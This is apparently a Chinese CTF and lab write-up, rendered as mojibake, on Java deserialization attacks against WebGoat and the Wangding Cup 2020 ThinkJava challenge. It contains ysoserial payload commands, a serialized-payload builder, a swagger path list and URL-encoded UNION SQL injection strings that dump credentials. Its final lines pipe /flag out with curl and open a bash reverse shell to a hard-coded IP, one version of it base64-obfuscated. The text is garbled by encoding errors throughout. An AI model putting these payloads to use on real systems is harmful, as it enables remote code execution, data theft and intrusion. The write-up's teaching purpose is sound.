å°±ç”¨Javaæ¼æ´é¶åœºwebgoatæ¥ç©ç©ï¼Œä¸è¿‡tmæ­å»ºäº†åŠå¤©ï¼Œè¿™æ–°ç‰ˆæœ¬ä¸ä¼šå¯åŠ¨ã€‚ã€‚ã€‚ã€‚è¿˜æ˜¯å»ºè®®ç”¨8.2.2çš„ç‰ˆæœ¬å§ webgoat-Insecure Deserialization æ‰¾åˆ°ç›¸åº”å…³å¡è¿™é‡Œè®©æˆ‘ä»¬æ›´æ”¹åºåˆ—åŒ–æ•°æ®ï¼Œè®©é¡µé¢å“åº”å»¶è¿Ÿ5ç§’å³å¯æˆåŠŸï¼Œé‚£æˆ‘ä»¬å…ˆå¯ä»¥éªŒè¯ä¸€ä¸‹è¿™é‡Œæ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ³¨å…¥ç‚¹ã€‚ åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬è§‚å¯Ÿåˆ°ä¸Šè¿°åºåˆ—åŒ–å¯¹è±¡æ—¶r00abå¼€å¤´ï¼Œè¿™è¯´æ˜æ˜¯Javaåºåˆ—åŒ–æ•°æ®ç»è¿‡baseåŠ å¯†çš„ç»“æœï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æºç è¿›è¡ŒéªŒè¯ æˆ‘ä»¬åœ¨ä¸Šè¿°è¾“å…¥1æäº¤ï¼ŒæŠ“ä¸€ä¸‹åŒ…çœ‹ä¸€ä¸‹Javaå¯¹åº”çš„å®ç°æ¥å£ï¼Œå¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ¥å£åœ°å€ä¸ºInsecureDeserialization/taskï¼Œæˆ‘ä»¬åˆ°å…¶Javaé¡¹ç›®ä¸­æ‰¾ä¸€ä¸‹ å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥ç±»åœ¨å¤„ç†ä¼ å…¥çš„tokenå‚æ•°æ—¶ï¼Œè¿›è¡Œäº†base64çš„è§£å¯†ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¦‚æœæ„é€ äº†Javaåºåˆ—åŒ–æ¶æ„æ•°æ®ä¹‹åè¿˜éœ€è¦è¿›è¡Œbase64çš„åŠ å¯† è¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸‹ysoserialå·¥å…·ï¼Œåœ¨è¿™é‡Œä½œç”¨å¤§æ¦‚å°±æ˜¯å¯ä»¥å‡­å€Ÿå³ä¾§ä¾èµ–ï¼ˆå¯¹åº”çš„Javaååºåˆ—åŒ–1æ¼æ´ç‚¹ï¼‰ç›´æ¥æ ¹æ®ç”¨æˆ·è¾“å…¥çš„æ¶æ„æ•°æ®ç”Ÿæˆä¾èµ–æ‰€å¯¹åº”çš„Javaååºåˆ—åŒ–1æ¼æ´çš„åºåˆ—åŒ–æ•°æ®ã€‚ è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ä¸Šè¿°å‘½ä»¤URLDNSï¼Œæˆ‘ä»¬åˆ©ç”¨dnslogå¹³å°å›æ˜¾æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ java -jar ysoserial-all.jar URLDNS \"http://wqqly89hgl2qwlw44cadp2xdo4uvin6c.oastify.com\" &gt; urldns.txt æ‰§è¡Œå®Œåæˆ‘ä»¬æ‰“å¼€å‘ç°æ˜¯acedå¼€å¤´ï¼Œbase64ç¼–ç ä¸€ä¸‹ import base64 file = open(\"urldns.txt\",\"rb\") now = file.read() ba = base64.b64encode(now) print(ba) file.close() è¿™é‡Œä¸çŸ¥ä¸ºä½•é‚£äº›dnslogå¹³å°éƒ½å´©äº†æ‰“ä¸å¼€ï¼Œå› æ­¤ç”¨äº†bpè‡ªå¸¦çš„è¿›è¡Œäº†éªŒè¯ ç‚¹å‡»ä¸Šè¿°copyå¤åˆ¶åè¾“å…¥ç›¸å…³å‘½ä»¤ï¼Œæœ€åå°†å¾—åˆ°çš„æ–‡ä»¶æ•°æ®è¿›è¡Œä¸€æ¬¡base644åŠ å¯†è¾“å‡º å°†å¾—åˆ°çš„æ•°æ®è¾“å…¥è‡³ä¸‹åˆ—è¾“å…¥æ¡†ä¸­ï¼Œæœ€åçœ‹åˆ°ä¸Šå›¾çš„bpä¸­æ˜¾ç¤ºäº†æœ€è¿‘ä¸€æ¬¡çš„è®¿é—®ï¼ŒéªŒè¯æˆåŠŸ æ¥ä¸‹æ¥åˆ©ç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ¥éªŒè¯ä¸€æ¬¡ java -Dhibernate5 -cp hibernate-core-5.4.28.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 \"calc.exe\" &gt; 1.bin è¿™é‡Œçš„hibernate-core-5.4.9.Final.jaræˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹è¿™é‡Œ å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æ”¯æŒHibernateçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨webgoatçš„jaråŒ…ä¸­æ‰¾åˆ°ç›¸å…³çš„ å¦‚ä¸Šå›¾æˆ‘ä»¬æ‰¾åˆ°äº†hibernate-core-5.4.28.Final.jarä¸€èˆ¬éƒ½æ˜¯æ‰¾coreè¿™ä¸ªåŒ…çš„ï¼Œè¿™æ˜¯æ’ä»¶çš„æ ¸å¿ƒ å¦‚å›¾æ‰§è¡ŒæˆåŠŸåæˆ‘ä»¬æ‰“å¼€x.binçœ‹ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°æ˜¯ä»¥acedå¼€å¤´çš„ï¼Œæ¥ä¸‹æ¥ç”¨ä¸ªPythonè„šæœ¬ç¼–ç ä¸€ä¸‹ è¿™é‡Œç¼–è¯‘å¥½ç›´æ¥è¾“å…¥è‡³è¾“å…¥æ¡†ä¸­å³å¯ï¼Œä½†è¿™é‡Œä¸çŸ¥é“ä¸ºä½•æˆ‘å¼¹ä¸å‡ºè®¡ç®—å™¨ è¿™é‡Œå…ˆå°è¯•å»¶è¿Ÿ5ç§’å§ï¼Œè¿™é‡Œç”±äºæ˜¯windowsç¯å¢ƒï¼Œå°±æ˜¯pingæ¥å®ç° InsecureDeserializationTask.java package org.owasp.webgoat.deserialization; import org.dummy.insecure.framework.VulnerableTaskHolder; import org.owasp.webgoat.assignments.AssignmentEndpoint; import org.owasp.webgoat.assignments.AssignmentHints; import org.owasp.webgoat.assignments.AttackResult; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.bind.annotation.RestController; import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.util.Base64; @RestController @AssignmentHints({\"insecure-deserialization.hints.1\", \"insecure-deserialization.hints.2\", \"insecure-deserialization.hints.3\"}) public class InsecureDeserializationTask extends AssignmentEndpoint { @PostMapping(\"/InsecureDeserialization/task\") @ResponseBody public AttackResult completed(@RequestParam String token) throws IOException { String b64token; long before; long after; int delay; b64token = token.replace('-', '+').replace('_', '/'); try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) { before = System.currentTimeMillis(); Object o = ois.readObject(); if (!(o instanceof VulnerableTaskHolder)) { if (o instanceof String) { return failed(this).feedback(\"insecure-deserialization.stringobject\").build(); } return failed(this).feedback(\"insecure-deserialization.wrongobject\").build(); } after = System.currentTimeMillis(); } catch (InvalidClassException e) { return failed(this).feedback(\"insecure-deserialization.invalidversion\").build(); } catch (IllegalArgumentException e) { return failed(this).feedback(\"insecure-deserialization.expired\").build(); } catch (Exception e) { return failed(this).feedback(\"insecure-deserialization.invalidversion\").build(); } delay = (int) (after - before); System.out.println(delay); if (delay &gt; 7000) { return failed(this).build(); } if (delay &lt; 3000) { return failed(this).build(); } return success(this).build(); } } è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºå¯¹postä¼ å…¥çš„tokenè¿›è¡Œäº†base64çš„è§£ç ï¼Œå¹¶ç”¨replaceåšäº†ä¸€å®šè¿‡æ»¤ï¼Œæ¥ç€Object o = ois.readObject();é€å…¥readobjectè¿›è¡Œååºåˆ—åŒ–ã€‚å¦‚æœååºåˆ—åŒ–çš„å¯¹è±¡oä¸æ˜¯VulnerableTaskHolderç±»çš„è¯å°±ä¼šæŠ›å‡ºé”™è¯¯ï¼Œæ¥ç€æœ€ååˆ¤æ–­delayçš„å¤§å°ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶åœ¨7-3ç§’å†… æˆ‘ä»¬è½¬åˆ°VulnerableTaskHolderç±»çš„å®ç°ï¼Œå¦‚ä¸‹åˆ—ä»£ç ï¼Œ package org.dummy.insecure.framework; import lombok.extern.slf4j.Slf4j; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.ObjectInputStream; import java.io.Serializable; import java.time.LocalDateTime; @Slf4j public class VulnerableTaskHolder implements Serializable { private static final long serialVersionUID = 2; private String taskName; private String taskAction; private LocalDateTime requestedExecutionTime; public VulnerableTaskHolder(String taskName, String taskAction) { super(); this.taskName = taskName; this.taskAction = taskAction; this.requestedExecutionTime = LocalDateTime.now(); } @Override public String toString() { return \"VulnerableTaskHolder [taskName=\" + taskName + \", taskAction=\" + taskAction + \", requestedExecutionTime=\" + requestedExecutionTime + \"]\"; } /** * Execute a task when de-serializing a saved or received object. * @author stupid develop */ private void readObject( ObjectInputStream stream ) throws Exception { //unserialize data so taskName and taskAction are available stream.defaultReadObject(); //do something with the data log.info(\"restoring task: {}\", taskName); log.info(\"restoring time: {}\", requestedExecutionTime); if (requestedExecutionTime!=null &amp;&amp; (requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(10)) || requestedExecutionTime.isAfter(LocalDateTime.now()))) { //do nothing is the time is not within 10 minutes after the object has been created log.debug(this.toString()); throw new IllegalArgumentException(\"outdated\"); } //condition is here to prevent you from destroying the goat altogether if ((taskAction.startsWith(\"sleep\")||taskAction.startsWith(\"ping\")) &amp;&amp; taskAction.length() &lt; 22) { log.info(\"about to execute: {}\", taskAction); try { Process p = Runtime.getRuntime().exec(taskAction); BufferedReader in = new BufferedReader( new InputStreamReader(p.getInputStream())); String line = null; while ((line = in.readLine()) != null) { log.info(line); } } catch (IOException e) { log.error(\"IO Exception\", e); } } } } è¿™é‡Œä»£ç ä¸­é‡å†™äº†readobjectå‡½æ•°ï¼Œå¹¶ä¸”é€šè¿‡æ¡ä»¶è¯­å¥é™åˆ¶äº†åªèƒ½ä½¿ç”¨sleepæˆ–pingåœ¨linuxä¸windowsç¯å¢ƒä¸‹å®ç°å»¶è¿Ÿæ•ˆæœï¼Œæœ€åé€šè¿‡Process p = Runtime.getRuntime().exec(taskAction);æ¥è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ SerializationHelperé‡Œé¢æä¾›äº†ä¸€äº›å·¥å…·ç±» package org.owasp.webgoat.deserialization; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.DataOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; import java.util.Base64; public class SerializationHelper { private static final char[] hexArray = \"0123456789ABCDEF\".toCharArray(); public static Object fromString(String s) throws IOException, ClassNotFoundException { byte[] data = Base64.getDecoder().decode(s); ObjectInputStream ois = new ObjectInputStream( new ByteArrayInputStream(data)); Object o = ois.readObject(); ois.close(); return o; } public static String toString(Serializable o) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(o); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static String show() throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); DataOutputStream dos = new DataOutputStream(baos); dos.writeLong(-8699352886133051976L); dos.close(); byte[] longBytes = baos.toByteArray(); return bytesToHex(longBytes); } public static String bytesToHex(byte[] bytes) { char[] hexChars = new char[bytes.length * 2]; for (int j = 0; j &lt; bytes.length; j++) { int v = bytes[j] &amp; 0xFF; hexChars[j * 2] = hexArray[v &gt;&gt;&gt; 4]; hexChars[j * 2 + 1] = hexArray[v &amp; 0x0F]; } return new String(hexChars); } } æ¥ä¸‹æ¥å°±æ˜¯æ„é€ ååºåˆ—åŒ–çš„payloadï¼Œæˆ‘ä»¬åœ¨webgoatæºç ä¸­VulnerableTaskHolderæ‰€åœ¨çš„ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªjavaç±»ï¼Œå…¶ä¸­çš„å†…å®¹å†™æˆ‘ä»¬éœ€è¦çš„æ¶æ„ä»£ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º package org.dummy.insecure.framework; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.util.Base64; public class SerialMain { static public void main(String[] args){ try{ //å‘VulnerableTaskHolderç±»ä¼ å…¥pingå‘½ä»¤ VulnerableTaskHolder go = new VulnerableTaskHolder(\"ping\", \"ping -n 6 127.0.0.1\"); //åˆ›å»ºä¸€ä¸ª ByteArrayOutputStream å¯¹è±¡ï¼Œç”¨äºå­˜å‚¨åºåˆ—åŒ–åçš„å­—èŠ‚æ•°æ®ã€‚ ByteArrayOutputStream bos = new ByteArrayOutputStream(); //åˆ›å»ºä¸€ä¸ª ObjectOutputStream å¯¹è±¡ï¼Œç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–åˆ° ByteArrayOutputStream ObjectOutputStream oos = new ObjectOutputStream(bos); //è¿›è¡Œååºåˆ—åŒ– oos.writeObject(go); //åˆ·æ–° ObjectOutputStreamï¼Œç¡®ä¿æ‰€æœ‰æ•°æ®éƒ½è¢«å†™å…¥åˆ° ByteArrayOutputStreamã€‚ oos.flush(); //è·å– ByteArrayOutputStream ä¸­çš„å­—èŠ‚æ•°ç»„ã€‚ byte[] exploit = bos.toByteArray(); //å°†å­—èŠ‚æ•°ç»„è¿›è¡Œ Base64 ç¼–ç ï¼Œå¾—åˆ°ä¸€ä¸ª Base64 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚ String exp = Base64.getEncoder().encodeToString(exploit); System.out.println(exp); } catch (Exception e){ } } } ä»£ç å†…å®¹å¦‚ä¸Šå›¾ï¼Œæ‰§è¡ŒSerialMainåç”Ÿæˆtokenï¼Œå¤åˆ¶åˆ°tokenå¤„æäº¤ã€‚ ä»consoleå¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†pingå‘½ä»¤ï¼Œä¸”taskä»»åŠ¡çš„å“åº”ä¹Ÿä¼šå˜æ…¢ã€‚ å¦‚ä¸Šå›¾æˆåŠŸé€šè¿‡ï¼Œç„¶åæˆ‘åœ¨è§£å†³ä¸Šè¿°é—®é¢˜çš„æ—¶å€™çªç„¶çœ‹åˆ°è¿™ä¸ªwebgoatçš„ç‰ˆæœ¬é€‚é…çš„æ˜¯jdk15ï¼Œç„¶åæˆ‘å°±ä¸‹è½½äº†15çš„æ¥é‡æ–°è¿è¡Œwebgoatï¼Œéšååˆå°è¯•å¼¹calcï¼Œtmdç«Ÿç„¶æˆäº†ï¼ï¼ï¼â€”è¿™æ„Ÿè§‰å°±æ˜¯çº¯çº¯jdkç‰ˆæœ¬é€‚é…é—®é¢˜å•Šã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿˜æœ‰ä¸€ç‚¹ï¼Œæˆ‘åœ¨ä½¿ç”¨bpçš„collaboratoræ—¶ï¼Œä¸€ç›´è¿æ¥ä¸ä¸Šå»ï¼Œç¿»äº†å¤šä¸ªæ–‡ç« å‘ç°æ˜¯æ ¡å›­ç½‘çš„é—®é¢˜ã€‚ã€‚ã€‚ã€‚ã€‚æ— è¯­ä½äº† 8.3 SerializationDumper æ•°æ®åˆ†æ é¡¹ç›®åœ°å€ï¼šhttps://github.com/NickstaDB/SerializationDumper è¿™ä¸ªå¯ä»¥ç”¨æ¥è¿›è¡ŒJavaååºåˆ—åŒ–1payloadä¹‹ç±»çš„æ•°æ®åˆ†æ java -jar SerializationDumper-v1.13.jar -r 1.bin &gt; 1.txt å¦‚å›¾æ‰€ç¤ºï¼Œå¯ä»¥è¾ƒä¸ºæ¸…æ¥šçš„å±•ç¤ºJavaååºåˆ—åŒ–1æ•°æ® 8.4 [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]ThinkJava è®¿é—®é¦–é¡µè¯´æ²¡æœ‰èº«ä»½æƒé™ï¼Œé‚£ä¼°è®¡éœ€è¦å…ˆrootä¸€ä¸‹ï¼Œè¿™é‡Œå…ˆçœ‹é¢˜ç›®ç»™çš„é™„ä»¶ // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package cn.abc.core.controller; import cn.abc.common.bean.ResponseCode; import cn.abc.common.bean.ResponseResult; import cn.abc.common.security.annotation.Access; import cn.abc.core.sqldict.SqlDict; import cn.abc.core.sqldict.Table; import io.swagger.annotations.ApiOperation; import java.io.IOException; import java.util.List; import org.springframework.web.bind.annotation.CrossOrigin; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @CrossOrigin @RestController @RequestMapping({\"/common/test\"}) public class Test { public Test() { } @PostMapping({\"/sqlDict\"}) @Access @ApiOperation(\"ä¸ºäº†å¼€å‘æ–¹ä¾¿å¯¹åº”æ•°æ®åº“å­—å…¸æŸ¥è¯¢\") public ResponseResult sqlDict(String dbName) throws IOException { List&lt;Table&gt; tables = SqlDict.getTableData(dbName, \"root\", \"abc@12345\"); return ResponseResult.e(ResponseCode.OK, tables); } } è¿™é‡Œç»™äº†ä¸€ä¸ª/common/testæ¥å£ï¼Œå…¶ä¸­ä¼šè®¿é—®sqlDictæ¥å£ï¼Œæ¥ç€ä¼ å…¥äº†æ•°æ®åº“çš„è´¦å·å’Œå¯†ç ï¼Œæˆ‘ä»¬è½¬åˆ°sqlDictçœ‹çœ‹ // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package cn.abc.core.sqldict; import java.sql.Connection; import java.sql.DatabaseMetaData; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.SQLException; import java.sql.Statement; import java.util.ArrayList; import java.util.List; public class SqlDict { public SqlDict() { } public static Connection getConnection(String dbName, String user, String pass) { Connection conn = null; try { Class.forName(\"com.mysql.jdbc.Driver\"); if (dbName != null &amp;&amp; !dbName.equals(\"\")) { dbName = \"jdbc:mysql://mysqldbserver:3306/\" + dbName; } else { dbName = \"jdbc:mysql://mysqldbserver:3306/myapp\"; } if (user == null || dbName.equals(\"\")) { user = \"root\"; } if (pass == null || dbName.equals(\"\")) { pass = \"abc@12345\"; } conn = DriverManager.getConnection(dbName, user, pass); } catch (ClassNotFoundException var5) { var5.printStackTrace(); } catch (SQLException var6) { var6.printStackTrace(); } return conn; } public static List&lt;Table&gt; getTableData(String dbName, String user, String pass) { List&lt;Table&gt; Tables = new ArrayList(); Connection conn = getConnection(dbName, user, pass); String TableName = \"\"; try { Statement stmt = conn.createStatement(); DatabaseMetaData metaData = conn.getMetaData(); ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[]{\"TABLE\"}); while(tableNames.next()) { TableName = tableNames.getString(3); Table table = new Table(); String sql = \"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '\" + dbName + \"' and table_name='\" + TableName + \"';\"; ResultSet rs = stmt.executeQuery(sql); while(rs.next()) { table.setTableDescribe(rs.getString(\"TABLE_COMMENT\")); } table.setTableName(TableName); ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, \"\"); ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName); String PK; for(PK = \"\"; rs2.next(); PK = rs2.getString(4)) { } while(data.next()) { Row row = new Row(data.getString(\"COLUMN_NAME\"), data.getString(\"TYPE_NAME\"), data.getString(\"COLUMN_DEF\"), data.getString(\"NULLABLE\").equals(\"1\") ? \"YES\" : \"NO\", data.getString(\"IS_AUTOINCREMENT\"), data.getString(\"REMARKS\"), data.getString(\"COLUMN_NAME\").equals(PK) ? \"true\" : null, data.getString(\"COLUMN_SIZE\")); table.list.add(row); } Tables.add(table); } } catch (SQLException var16) { var16.printStackTrace(); } return Tables; } } è¿™é‡Œçœ‹åˆ°getTableDataç”¨æ¥æŸ¥è¯¢æ•°æ®åº“æ•°æ®ï¼Œå…¶ä¸­sqlè¯­å¥æ²¡åšè¿‡æ»¤ï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œä½†æˆ‘ä»¬åœ¨testä¸­ä¼šçœ‹åˆ°å¦‚ä¸‹å›¾ï¼Œå¯¼å…¥çš„åŒ…ä¸­å«æœ‰swagger æˆ‘ä»¬ç™¾åº¦æŸ¥ä¸€ä¸‹ç›¸å…³èµ„æ–™ï¼š Swaggeræ˜¯ä¸€ä¸ªè§„èŒƒå’Œå®Œæ•´çš„æ¡†æ¶ï¼Œç”¨äºç”Ÿæˆã€æè¿°ã€è°ƒç”¨å’Œå¯è§†åŒ– RESTful é£æ ¼çš„ Web æœåŠ¡ï¼ŒJAVAåœ¨é‡‘èæœºæ„å¼€å‘è¯­è¨€çš„åœ°ä½ä¸€ç›´å±…é«˜ä¸ä¸‹ï¼Œè€Œä½œä¸ºJAVAå±ŠæœåŠ¡ç«¯çš„å¤§ä¸€ç»Ÿæ¡†æ¶Springï¼Œä¾¿å°†Swaggerè§„èŒƒçº³å…¥è‡ªèº«çš„æ ‡å‡†ï¼Œå»ºç«‹äº†Spring-swaggeré¡¹ç›®ï¼Œæ‰€ä»¥åœ¨å®é™…æµ‹è¯•ç¯å¢ƒä¸­ï¼ŒåŸºäºspringæ¡†æ¶çš„swagger-uiæ¥å£å±•ç¤ºåŠè°ƒè¯•æ–‡æ¡£é¡µé¢æœ€ä¸ºå¸¸è§ã€‚ è¿™é‡Œæˆ‘ä»¬æœçš„æ—¶å€™ä¼šå‘ç°ä»–ä¼šæç¤ºæœ‰ä¸ªswagger-uiæ¼æ´ï¼Œé‚£æˆ‘ä»¬ç»§ç»­äº†è§£ä¸€ä¸‹ä¼šå‘ç°è¿™ç©æ„å„¿å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ /api /api-docs /api-docs/swagger.json /api.html /api/api-docs /api/apidocs /api/doc /api/swagger /api/swagger-ui /api/swagger-ui.html /api/swagger-ui.html/ /api/swagger-ui.json /api/swagger.json /api/swagger/ /api/swagger/ui /api/swagger/ui/ /api/swaggerui /api/swaggerui/ /api/v1/ /api/v1/api-docs /api/v1/apidocs /api/v1/swagger /api/v1/swagger-ui /api/v1/swagger-ui.html /api/v1/swagger-ui.json /api/v1/swagger.json /api/v1/swagger/ /api/v2 /api/v2/api-docs /api/v2/apidocs /api/v2/swagger /api/v2/swagger-ui /api/v2/swagger-ui.html /api/v2/swagger-ui.json /api/v2/swagger.json /api/v2/swagger/ /api/v3 /apidocs /apidocs/swagger.json /doc.html /docs/ /druid/index.html /graphql /libs/swaggerui /libs/swaggerui/ /spring-security-oauth-resource/swagger-ui.html /spring-security-rest/api/swagger-ui.html /sw/swagger-ui.html /swagger /swagger-resources /swagger-resources/configuration/security /swagger-resources/configuration/security/ /swagger-resources/configuration/ui /swagger-resources/configuration/ui/ /swagger-ui /swagger-ui.html /swagger-ui.html#/api-memory-controller /swagger-ui.html/ /swagger-ui.json /swagger-ui/swagger.json /swagger.json /swagger.yml /swagger/ /swagger/index.html /swagger/static/index.html /swagger/swagger-ui.html /swagger/ui/ /Swagger/ui/index /swagger/ui/index /swagger/v1/swagger.json /swagger/v2/swagger.json /template/swagger-ui.html /user/swagger-ui.html /user/swagger-ui.html/ /v1.x/swagger-ui.html /v1/api-docs /v1/swagger.json /v2/api-docs /v3/api-docs è¿™é‡Œä¹Ÿæ˜¯çœ‹äº†wpè¦è®¿é—®swagger-ui.htmlé¡µé¢ æŸ¥çœ‹ä¸€ç•ªå‘ç°å…¶æœ‰ä¸‰ä¸ªæ¥å£ï¼Œå¯¹åº”ç€é¢˜ç›®é™„ä»¶ä¸­æºç ä¸­çš„javaæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç°åœ¨dbNameå¤„è¿›è¡Œsqlæ³¨å…¥æ‹¿åˆ°è´¦å·å¯†ç  ä¸è¿‡è¿™é‡Œæ¶‰åŠåˆ°äº†jdbcçš„sqlæ³¨å…¥ï¼Œè¿™é‡Œå…ˆè·Ÿç€æµ…å­¦ä¸€ä¸‹ï¼Œä¸€ä¼šå„¿æ·±å…¥ï¼Œæˆ‘ä»¬å®šä½åˆ°ä¸‹å›¾ è¿™é‡Œçœ‹å¸ˆå‚…ä»¬è¯´è¿™é‡Œç”±äºè¿›è¡Œäº†dbNameçš„æ‹¼æ¥ï¼Œé‚£æˆ‘ä»¬åœ¨è¿›è¡Œsqlæ³¨å…¥çš„æ—¶å€™è¦æ»¡è¶³jdbcåè®®çš„è¿æ¥ä¸èƒ½å‡ºé”™ï¼Œå› æ­¤è¿™é‡Œä¼šç”¨åˆ°ç±»ä¼¼urlçš„é”šç‚¹ï¼ˆè¿™é‡Œåšå®Œåœ¨äº†è§£ä»€ä¹ˆæ˜¯é”šç‚¹ï¼‰ jdbc sql æ³¨å…¥ å…³äº#çš„ä½¿ç”¨ åœ¨urlä¸­#è¡¨ç¤ºé”šç‚¹ï¼Œè¡¨ç¤ºç½‘é¡µä¸­çš„ä¸€ä¸ªä½ç½®ï¼Œæ¯”å¦‚http:xxx/index.html#aaaï¼Œæµè§ˆå™¨è¯»å–è¿™ä¸ªurlï¼Œä¼šå°†aaaç§»åˆ°å¯è§†ä½ç½®ã€‚åœ¨ç¬¬ä¸€ä¸ª#ï¼Œéƒ½ä¼šè¢«è§†ä¸ºä½ç½®æ ‡è¯†ç¬¦ï¼Œä¸ä¼šè¢«å‘é€åˆ°æœåŠ¡ç«¯ è€Œjdbcç±»ä¼¼äºurlè§£æï¼Œæ‰€ä»¥ä¼šå¿½ç•¥#åé¢çš„å­—ç¬¦ è€Œ#åˆæ˜¯sqlæ³¨å…¥ä¸­çš„æ³¨é‡Šç¬¦ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦åœ¨urlä¸­ä¼ #ï¼Œé‚£ä¹ˆéœ€è¦è¿›è¡Œurlç¼–ç ä¸º%23 æŸ¥çœ‹æ•°æ®åº“ï¼Œè¿™é‡Œæ˜¯getä¼ å‚ï¼Œè¿™é‡Œæµ‹è¯•äº†å‡ æ³¢å‘ç°éœ€è¦å°†å•å¼•å·ï¼Œ#å’Œç©ºæ ¼è¿›è¡Œurlç¼–ç  ?dbName=myapp%23%27%20union%20select%20group_concat(SCHEMA_NAME)from(information_schema.schemata)%23 çˆ†è¡¨ådbName=myapp%23%27%20union%20select%20group_concat(table_name)from(information_schema.tables)where(table_schema%3D%27myapp%27)%23 çˆ†å­—æ®µåï¼š dbName=myapp%23%27%20union%20select%20group_concat(column_name)from(information_schema.columns)where((table_schema%3D%27myapp%27)and(table_name%3D%27user%27))%23 çˆ†ç”¨æˆ·åå¯†ç ï¼š dbName=myapp%23%27%20union%20select%20group_concat(name,0x3a,pwd)from%20user%23 è¿™æ ·çš„è¯å°±æ‹¿åˆ°äº†ç”¨æˆ·è´¦å·å’Œå¯†ç ï¼Œä½¿ç”¨è´¦å·å¯†ç ç™»å½• å¦‚ä¸Šå›¾ï¼Œç™»é™†æˆåŠŸ å¾€ä¸‹ç¿»å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„bodyéƒ¨åˆ†å­˜åœ¨r00abå¼€å¤´çš„ï¼Œè¿™å¾ˆæ˜æ˜¾å°±æ˜¯Javaååºåˆ—åŒ–1ç»è¿‡base64ç¼–ç åçš„ç»“æœï¼Œé‚£æˆ‘ä»¬éªŒè¯ä¸€ä¸‹è¿™é‡Œæ˜¯å¦å­˜åœ¨Javaååºåˆ—åŒ–1æ¼æ´ å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯bpè‡ªå¸¦çš„æ’ä»¶ï¼Œå¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å‘ç°ç¡®å®å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ æ¥ä¸‹æ¥ä½¿ç”¨ysoserialæ‰“ ysoserial java -jar ysoserial-all.jar ROME \"curl http://ip:5555 -d @/flag\" &gt; 1.bin bash -i &gt;&amp; /dev/tcp/124.220.233.26/5555 0&gt;&amp;1 java -jar ysoserial-all.jar ROME \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}\" &gt; 1.bin ä¸Šè¿°å‘½ä»¤æ‰“å®Œè®°å¾—base64ç¼–ç  æœ¬æ¥æˆ‘ä»¬åˆ†æé“Authorizationä¼šå°†ç”¨æˆ·çš„tokenä¿¡æ¯è¿›è¡ŒJavaåºåˆ—åŒ–å¹¶ç¼–ç ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ è€Œå·²çš„Javaåºåˆ—åŒ–æ•°æ®ä¼ ç»™Authorizationï¼Œè¿™æ ·åœ¨è§£æçš„æ—¶å€™å°±ä¼šååºåˆ—åŒ–æˆ‘ä»¬çš„æ¶æ„æ•°æ®ï¼Œè¿›è€Œæ‹¿åˆ°shellç­‰ã€‚ 